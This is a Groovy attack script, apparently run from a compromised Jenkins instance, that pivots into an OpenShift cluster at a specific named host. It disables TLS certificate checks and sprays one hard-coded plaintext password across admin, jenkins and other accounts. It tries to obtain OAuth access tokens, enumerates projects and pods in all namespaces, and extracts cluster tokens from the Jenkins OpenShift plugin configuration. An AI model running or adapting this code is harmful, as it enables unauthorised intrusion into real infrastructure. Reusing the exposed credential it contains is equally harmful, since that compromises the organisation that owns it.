// OpenShift REST API pivot via Groovy HttpURLConnection
// No necesita oc CLI - llama directo a la API

import javax.net.ssl.*
import java.security.cert.X509Certificate

// Disable SSL verification
TrustManager[] trustAll = [new X509TrustManager() {
    public X509Certificate[] getAcceptedIssuers() { return null }
    public void checkClientTrusted(X509Certificate[] chain, String authType) {}
    public void checkServerTrusted(X509Certificate[] chain, String authType) {}
}]
SSLContext sc = SSLContext.getInstance("TLS")
sc.init(null, trustAll, new java.security.SecureRandom())
HttpsURLConnection.setDefaultSSLSocketFactory(sc.socketFactory)
HttpsURLConnection.setDefaultHostnameVerifier({ hostname, session -> true })

def apiGet = { url, token ->
    try {
        def conn = new URL(url).openConnection()
        conn.setRequestProperty("Authorization", "Bearer ${token}")
        conn.setRequestProperty("Accept", "application/json")
        conn.setConnectTimeout(15000)
        conn.setReadTimeout(15000)
        def code = conn.responseCode
        def body = code < 400 ? conn.inputStream.text : conn.errorStream?.text ?: "ERROR"
        return [code: code, body: body]
    } catch(e) {
        return [code: -1, body: e.message]
    }
}

def apiBasicAuth = { url, user, pass ->
    try {
        def auth = Base64.encoder.encodeToString("${user}:${pass}".bytes)
        def conn = new URL(url).openConnection()
        conn.setRequestProperty("Authorization", "Basic ${auth}")
        conn.setRequestProperty("Accept", "application/json")
        conn.setConnectTimeout(15000)
        conn.setReadTimeout(15000)
        def code = conn.responseCode
        def body = code < 400 ? conn.inputStream.text : conn.errorStream?.text ?: "ERROR"
        return [code: code, body: body]
    } catch(e) {
        return [code: -1, body: e.message]
    }
}

def BASE = "https://console.dev.amxnova.net:8443"
def CREDS = [
    ["sophia-mrk-i", "plug*spoke!MosqueCloud3col"],
    ["cs-jenkins-deployer", "plug*spoke!MosqueCloud3col"],
    ["admin", "plug*spoke!MosqueCloud3col"],
    ["jenkins", "plug*spoke!MosqueCloud3col"],
]

println "=== OPENSHIFT API REST ENUM ==="
println "Target: ${BASE}"
println ""

// 1. Health check
println "--- [1] HEALTH CHECK ---"
def health = apiBasicAuth("${BASE}/healthz", "sophia-mrk-i", "plug*spoke!MosqueCloud3col")
println "Health: ${health.code} - ${health.body.take(200)}"

// 2. OpenShift OAuth - get token via challengeToken request
println "\n--- [2] OAUTH TOKEN (challenge) ---"
CREDS.each { cred ->
    def user = cred[0]
    def pass = cred[1]
    try {
        def auth = Base64.encoder.encodeToString("${user}:${pass}".bytes)
        def challengeUrl = "${BASE}/oauth/authorize?client_id=openshift-challenging-client&response_type=token"
        def conn = new URL(challengeUrl).openConnection()
        conn.setInstanceFollowRedirects(false)
        conn.setRequestProperty("Authorization", "Basic ${auth}")
        conn.setRequestProperty("X-CSRF-Token", "1")
        conn.setConnectTimeout(15000)
        conn.setReadTimeout(15000)
        def code = conn.responseCode
        def location = conn.getHeaderField("Location") ?: ""
        println "[${user}] Status: ${code}"
        if (location) {
            println "[${user}] Location: ${location}"
            // Extract token from location
            def m = location =~ /access_token=([^&]+)/
            if (m.find()) {
                def token = m.group(1)
                println "*** TOKEN FOUND: ${token} ***"
                
                // Use token to enumerate
                println "\n--- [3] ENUMERATE WITH TOKEN ---"
                def projects = apiGet("${BASE}/oapi/v1/projects", token)
                println "Projects (${projects.code}): ${projects.body.take(2000)}"
                
                def pods = apiGet("${BASE}/api/v1/pods", token)
                println "\nPods All NS (${pods.code}): ${pods.body.take(3000)}"
            }
        }
        def body = code < 400 ? conn.inputStream?.text : conn.errorStream?.text ?: ""
        if (body && body.length() > 5) println "[${user}] Body: ${body.take(500)}"
    } catch(e) {
        println "[${user}] Error: ${e.message}"
    }
}

// 3. Intentar Basic Auth directo a la API (OpenShift 3.x lo soporta)
println "\n--- [3] BASIC AUTH DIRECTO A API ---"
CREDS.each { cred ->
    def r = apiBasicAuth("${BASE}/oapi/v1/projects", cred[0], cred[1])
    println "[${cred[0]}] /oapi/v1/projects: ${r.code} - ${r.body.take(300)}"
}

// 4. API sin auth para info pública
println "\n--- [4] API INFO SIN AUTH ---"
["/api", "/oapi", "/version", "/api/v1", "/.well-known/oauth-authorization-server"].each { path ->
    def r = apiBasicAuth("${BASE}${path}", "", "")
    println "${path}: ${r.code} - ${r.body.take(300)}"
}

// 5. Probar con el token de la credencial sophia (si fuera un token de SA)
// sophia-mrk-i podría ser también el password del SA token
println "\n--- [5] SOPHIA PASSWORD AS SA TOKEN ---"
def sophiaTokens = [
    "plug*spoke!MosqueCloud3col",
    "plugspoketMosqueCloud3col",
]
sophiaTokens.each { tok ->
    def r = apiGet("${BASE}/oapi/v1/projects", tok)
    println "Token [${tok.take(20)}...]: ${r.code} - ${r.body.take(200)}"
}

// 6. Recuperar info de OpenShift de la configuración de un job 
// Los jobs con openshift-sync tienen el token en su configuración
println "\n--- [6] OPENSHIFT TOKEN VIA JOB CONFIG ---"
try {
    def openShiftDesc = Class.forName("com.openshift.jenkins.plugins.OpenShift_-DescriptorImpl").getDeclaredMethod("get").invoke(null)
    println "OpenShift Descriptor found"
    openShiftDesc.getClusterConfigs().each { cluster ->
        println "Cluster: ${cluster.name} | Server: ${cluster.serverUrl}"
        println "Credential ID: ${cluster.credentialId}"
        println "Default project: ${cluster.defaultProject}"
        if (cluster.hasProperty("token")) println "Token: ${cluster.token}"
    }
} catch(e) {
    println "OpenShift descriptor error: ${e.message}"
}

// 7. Usar OpenShift Plugin directamente para llamadas API
println "\n--- [7] OPENSHIFT PLUGIN API CALL ---"
try {
    def os = Class.forName("com.openshift.restclient.ClientBuilder")
    println "ClientBuilder found: ${os}"
} catch(e) {
    println "No OpenShift REST client: ${e.message}"
}

println "\n=== FIN OPENSHIFT REST ==="
